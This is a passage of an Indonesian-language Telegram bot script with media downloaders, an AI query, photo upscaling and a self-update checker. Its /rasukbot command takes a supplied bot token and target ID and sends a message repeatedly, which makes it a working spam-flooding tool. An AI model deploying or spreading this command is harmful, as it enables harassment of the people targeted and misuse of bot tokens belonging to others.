  const chatId = msg.chat.id;
  const query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await bot.sendMessage(chatId, "⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return bot.sendMessage(
        chatId,
        "```\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return bot.sendMessage(chatId, "⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) return bot.sendMessage(chatId, "⚠️ Contoh: /play snowchild");

  try {
    const wait = await bot.sendMessage(chatId, "🎧 Nyari lagunya bre...");

    // Search Spotify
    const searchApi = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const res = await axios.get(searchApi);

    if (!res.data.success || !res.data.result?.length) {
      return bot.editMessageText("❌ Lagu tidak ditemukan bre!", {
        chat_id: chatId,
        message_id: wait.message_id,
      });
    }

    const top = res.data.result[0];

    // ambil mp3 dari spotify v2
    const dl = await axios.get(
      `https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(top.url)}`
    );

    const mp3 = dl.data?.data?.mp3DownloadLink;
    if (!mp3) throw new Error("Gagal ambil link mp3 bre!");

    // download buffer
    const buffer = await axios
      .get(mp3, { responseType: "arraybuffer" })
      .then((r) => Buffer.from(r.data));

    await bot.sendAudio(chatId, buffer, {
      title: top.title || "Unknown",
      performer: top.artist || "Unknown",
    });

    bot.deleteMessage(chatId, wait.message_id).catch(() => {});

  } catch (e) {
    bot.sendMessage(chatId, "❌ Error: " + e.message);
  }
});

bot.onText(/^\/bratvid(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = (match[1] || "").trim();

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Contoh:\n/bratvid woi kontol");
  }

  bot.sendMessage(chatId, "🎬 Lagi bikin sticker videonya bre...");

  try {
    const res = await fetch(`https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);

    const buffer = Buffer.from(await res.arrayBuffer()); // ✅ FIX disini

    const tmpFile = path.join(__dirname, `bratvid_${Date.now()}.webm`);
    fs.writeFileSync(tmpFile, buffer);

    await bot.sendSticker(chatId, tmpFile);

    fs.unlinkSync(tmpFile);
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Gagal generate sticker video.");
  }
});

bot.onText(/^\/hd$/, async (msg) => {
  const chatId = msg.chat.id;

  // HARUS reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Reply foto dulu baru ketik /hd cok."
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Lagi ng-HD foto lu bre...");

    // Ambil foto resolusi tertinggi
    const photo = msg.reply_to_message.photo.pop();
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto dari Telegram
    const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(dl.data);

    // Upload ke tmpfiles
    const FormData = require("form-data");
    const form = new FormData();
    form.append("file", buffer, "image.jpg");

    const upload = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });

    const link = upload.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");

    // API HD
    const hd = await axios.get(
      `https://api.nekolabs.web.id/tools/pxpic/restore?imageUrl=${encodeURIComponent(link)}`
    );

    if (!hd.data.success) {
      throw new Error("Gagal HD cok.");
    }

    const result = hd.data.result;

    // Kirim hasil HD
    await bot.sendPhoto(chatId, result, {
      caption: `✅ Foto berhasil di-HD cok!\n${result}`,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("HD ERROR:", err);
    bot.sendMessage(chatId, "❌ Error cok, fotonya ga bisa di-HD.");
  }
});

bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixcode", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
  }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});

bot.onText(/^\/rasukbot(?: (.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = (match[1] || "").trim();
  const reply = msg.reply_to_message;

  // Jika user hanya mengetik /rasukbot tanpa apapun
  if (!input) {
    return bot.sendMessage(chatId,
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    // Jika user membalas pesan seseorang
    if (reply) {
      const parts = input.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return bot.sendMessage(chatId,
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {
      // Format manual tanpa reply
      if (!input.includes("|")) {
        return bot.sendMessage(chatId,
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = input.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return bot.sendMessage(chatId,
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await bot.sendMessage(chatId, "🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    bot.sendMessage(chatId, `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`, {
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim();

  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/^\/ssweb (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    if (!text || !text.trim()) {
        return bot.sendMessage(chatId, "Contoh:\n/ssweb google.com");
    }

    try {
        bot.sendChatAction(chatId, "upload_photo").catch(() => {});

        let cleanUrl = text.replace(/^https?:\/\//, "").trim();
        let finalUrl = "https://" + cleanUrl;

        let ssImage = "https://image.thum.io/get/width/1900/crop/1000/fullpage/" + finalUrl;

        await bot.sendPhoto(chatId, ssImage, {
            caption: "_berhasil ssweb_",
            parse_mode: "Markdown"
        });

    } catch (e) {
        console.log("SSWEB ERROR:", e);
        bot.sendMessage(chatId, "⚠️ Server SS Web sedang offline atau URL tidak valid.");
    }
}); 

// ===== UPDATE COMMAND =====
// Command /ubdatenew
bot.onText(/\/ubdatenew/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek admin/owner
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "⚠️ *Akses Ditolak!*\nHanya Owner/Admin yang bisa mengupdate bot!", { parse_mode: "Markdown" });
    }

    await performUpdate(chatId);
});
// ===== END UPDATE COMMAND =====

bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(`✅ Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

// ===== AUTO UPDATE CHECKER =====
// Auto-check setiap 30 menit untuk premium users
setInterval(async () => {
    try {
        const remoteVersion = await getRemoteVersion();
        const localVersion = require("./version.json");
        const remoteScript = await downloadGitHubFile(UPDATE_CONFIG.GITHUB_RAW_URL);
        
        const localHash = getFileHash("./ValtixInvicta.js");
        const remoteHash = crypto.createHash('md5').update(remoteScript).digest('hex');
        
        // Notifikasi jika ada perubahan
        if (remoteVersion.version !== localVersion.version || localHash !== remoteHash) {
            const premiumChats = premiumUsers.filter(user => 
                new Date(user.expiresAt) > new Date()
            ).map(user => user.id);

            for (const userId of premiumChats) {
                try {
                    await bot.sendMessage(userId, `🚀 *UPDATE MENUNGGU!*
                    
Hai *Premium User*! Ada perubahan di server GitHub.

📊 *Status:*
• Versi: ${localVersion.version} → ${remoteVersion.version}
• File: ${localHash !== remoteHash ? '✅ MODIFIED' : '❌ Unchanged'}

⚡ Ketik /ubdatenew untuk update sekarang!`, { parse_mode: "Markdown" });
                } catch (e) {
                    console.log(`Gagal notif ke ${userId}:`, e.message);
                }
            }
        }
    } catch (error) {
        console.error("Auto-check error:", error.message);
    }
}, UPDATE_CONFIG.AUTO_CHECK_INTERVAL);

// Cek update saat startup
setTimeout(async () => {
    try {
        const remoteVersion = await getRemoteVersion();
        const localVersion = require("./version.json");
        
        if (remoteVersion.version !== localVersion.version) {
            console.log(chalk.yellow(`⚠️  Update tersedia! Versi ${localVersion.version} → ${remoteVersion.version}`));
        }
    } catch (e) {
        console.log(chalk.red("❌ Gagal cek update saat startup"));
    }
}, 5000);

console.log(chalk.green("✅ Update System aktif! Auto-check setiap 30 menit."));
// ===== END AUTO UPDATE CHECKER =====
